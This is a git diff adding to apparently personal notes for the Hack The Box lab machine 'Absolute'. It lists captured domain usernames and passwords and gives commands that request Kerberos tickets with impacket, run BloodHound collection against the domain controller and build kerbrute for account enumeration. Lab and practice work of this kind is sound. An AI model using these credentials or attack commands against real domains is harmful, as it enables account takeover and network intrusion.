@@ -30,5 +30,41 @@ d.klay : Darkmoonsky248girl
 Reset the dae
 
 ### Done
-      
 
+```
+d.klay@ABSOLUTE.HTB : Darkmoonsky248girl
+
+SVC_SMB@ABSOLUTE.HTB : AbsoluteSMBService123!
+```
+      
+```bash
+sed -i 's/10.129.138.0/NEW/g' Absolute-*.md
+
+sudo sed -i 's/10.129.138.0/NEW/g' /etc/hosts
+
+echo "10.129.138.0 dc.absolute.htb absolute.htb" | sudo tee -a /etc/hosts
+sudo ntpdate -s dc.absolute.htb
+impacket-getTGT -dc-ip 10.129.138.0 absolute.htb/d.klay:Darkmoonsky248girl
+impacket-getTGT -dc-ip 10.129.138.0 absolute.htb/SVC_SMB:AbsoluteSMBService123!
+# /opt/BloodHound.py/bloodhound.py
+# bloodhound-python
+# Beware docker container need to be sync to DC!
+
+KRB5CCNAME=d.klay.ccache $bloodhoundPythonInstallMethod -k -dc dc.absolute.htb -ns 10.129.138.0 -c all -d absolute.htb -u d.klay -p 'Darkmoonsky248girl' --zip
+```
+
+VM requires
+```bash
+cd /opt/
+git clone https://github.com/ropnop/kerbrute.git
+wait
+cd kerbrute/
+go build
+wait
+cd /opt/
+echo "\n# Kerbrute Alias" | tee -a ~/.zshrc
+echo "alias kerbrute='/opt/kerbrute/kerbrute" | tee -a ~/.zshrc
+
+
+source ~/.zshrc
+```
